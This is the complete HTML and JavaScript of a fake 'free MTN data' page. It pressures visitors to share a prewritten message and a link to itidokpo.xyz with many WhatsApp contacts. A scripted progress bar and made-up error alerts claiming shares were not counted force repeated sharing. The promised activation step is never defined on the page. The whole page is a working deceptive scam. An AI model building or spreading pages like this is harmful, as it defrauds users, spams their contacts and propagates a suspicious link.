<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Share</title>
    <style>
        button {
            display: block;
            width: 200px;
            height: 50px;
            color: #fff;
            border: none;
            outline: none;
            font-size: 24px;
            cursor: pointer;
            border-radius: 5px;
            padding: 0 10px;
            margin: 10px auto;
            background: rgb(255, 202, 6);
            transition: background 0.3s ease;
        }
        button:hover {
            background: #098105;
        }
        .barr {
            direction: ltr;
            max-width: 400px;
            margin: 10px auto;
            box-sizing: border-box;
        }
        .fill {
            position: relative;
            display: inline-block;
            width: calc(100% - 100px);
            height: 35px;
            padding: 2px;
            border: 2px solid #098105;
        }
        #fill2 {
            background: #098105;
            width: 0%;
            height: 100%;
        }
        .percentage {
            width: 100px;
            float: right;
            height: 35px;
            font-size: 16px;
            border: 2px solid #098105;
        }
        .center {
            display: flex;
            align-items: center;
            justify-content: center;
        }
        #percentage2 {
            margin-left: 5px;
        }
        .tip {
            font-size: 14px;
            text-align: center;
        }
        .title {
            text-align: center;
        }
    </style>
</head>
<body>
    <div style="max-width: 500px; margin: 0 auto; padding: 20px;">
        <p class="tip">Complete the verification process to receive your 1 Month Free Data now</p>
        <p class="tip">1. Share it with 5 groups or 15 friends on WhatsApp (Click on the "SHARE" icon below).</p>
        <p class="tip">2. You will be redirected automatically to "ACTIVATION" page after the GREEN verification bar is filled.</p>

        <button id="whatsapp"><font color="black">SHARE</font></button>
        
        <div class="barr">
            <div class="fill">
                <div id="fill2"></div>
            </div>
            <div class="percentage center">
                <span><i class="fa fa-spinner fa-pulse"></i></span>
                <span id="percentage2">0%</span>
            </div>
        </div>
    </div>

    <script src="https://code.jquery.com/jquery-latest.min.js"></script>
    <script>
        var text1 = "*MTN 1 MONTH FREE DATA FOR OLD SUBSCRIBERS 🎉*%0A%0AGet 1 Month Free Data if your MTN Sim Card is up to a year old%0A%0A*HOW OLD IS YOUR SIM CARD*?%0A1 Year Old - 5GB%0A2 Years and above - 10GB%0A5 - 10 Years - 20GB%0A10 Years and above - 50GB  %0A%0A*Get Offer*👇%0Ahttps://itidokpo.xyz/freemtndata",
            error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
            saved = "",
            share = "whatsapp://send?text="+text1;
        
        var width = 0;
        
        $("#whatsapp").click(function () {
            window.location.href = share;
            if (width == 0) {
                width += 50;
            } else if (width == 50) {
                alert(error);
                width += 15;
            } else if (width == 65) {
                width += 5;
            } else if (width == 70) {
                alert(error);
                width += 10;
            } else if (width == 80) {
                alert(error);
                width += 5;
            } else if (width == 85) {
                width += 2;
            } else if (width == 87) {
                width += 1;
            } else if (width == 88) {
                width += 2;
            } else if (width == 90) {
                width += 1;
            } else if (width == 91) {
                width += 1;
            } else if (width == 92) {
                width += 1;
            } else if (width == 93) {
                width += 1;
            } else if (width == 94) {
                width += 1;
            } else if (width == 95) {
                width += 1;
            } else if (width == 96) {
                width += 2;
            } else {
                $("#share").fadeOut(0);
                $("#claim").fadeIn(1000);
            }
            localStorage.setItem(saved, width);
            setTimeout(function () {
                $("#fill2").css("width", width + "%");
                $("#percentage2").text(width + "%");
            }, 2000);
        });
    </script>
</body>
</html>
